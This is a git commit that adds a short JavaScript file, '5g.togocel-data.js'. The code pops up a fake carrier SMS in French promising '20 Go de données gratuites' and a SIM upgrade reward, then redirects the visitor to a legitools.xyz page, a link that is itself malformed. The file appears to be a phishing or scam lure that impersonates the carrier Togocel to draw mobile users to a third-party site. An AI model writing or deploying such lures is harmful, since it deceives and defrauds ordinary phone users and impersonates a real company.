cb9fcfc3c9e099f0e0fe6e1bd28fb2e1636e07a3
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-10-15 01:51:20 -0700

    Create 5g.togocel-data.js

---
+++ 5g.togocel-data.js
@@ -0,0 +1,5 @@
+var password = '20 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 20 Go de données gratuites 4G ou 5G UPGRADE SIM CARD REWARD, veuillez appuyer sur OK pour ACTIVER. ','20 Go de données gratuites');
+if (password != '20 Go de données gratuites') {
+location.href='https://https://legitools.xyz/5g.togocel-data.html';
+}
